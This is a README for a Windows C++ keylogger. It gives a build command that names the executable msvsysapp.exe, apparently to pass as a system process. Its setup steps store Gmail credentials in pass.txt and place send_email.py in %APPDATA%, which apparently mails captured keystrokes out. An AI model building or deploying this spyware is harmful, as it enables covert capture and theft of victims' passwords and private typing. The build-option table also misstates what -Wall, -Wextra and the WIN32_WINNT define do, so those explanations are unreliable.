# C++ Windows KeyLogger by Fibek

something about this app...

# Build options

    g++ main.cpp KeyLogger.cpp CClip.cpp -Wall -Wextra -std=c++11 -D_WIN32_WINNT=0x0501 -w -o msvsysapp.exe

| Build option            | Meaning                                                |    
| :---------------------- | :----------------------------------------------------- |
| `-Wall`                 | required to working multithreading with MinGW compiler |
| `-Wextra`               | required to working multithreading with MinGW compiler |
| `-D_WIN32_WINNT=0x0501` | required to working multithreading with MinGW compiler |
| `-w`                    | skip all warnings                                      |
| `-o msvsysapp.exe`      | ouput = msvsysapp.exe                                  |

# Setup

1. Create pass.txt 

    `example@gmail.com
     password`
     
2. Copy send_email.py to %APPDATA%

3. Make msvsysapp.exe with build options

